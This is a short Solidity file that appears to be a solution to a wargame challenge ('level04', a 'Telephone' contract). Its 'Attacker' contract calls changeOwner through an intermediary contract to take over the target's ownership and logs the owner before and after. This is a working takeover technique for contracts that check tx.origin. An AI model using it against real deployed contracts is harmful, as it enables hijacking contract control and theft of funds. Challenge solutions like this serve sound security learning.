// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "src/level04.sol";
import "hardhat/console.sol";

contract Attacker
{
    Telephone level04 = Telephone(0xe9359849E96B548Faf8399A11d217A2AC5FE13eB);

    function hack() external 
    {
        console.log("Owner:", level04.owner());

        level04.changeOwner(msg.sender);

        console.log("Owner:", level04.owner());
    }
}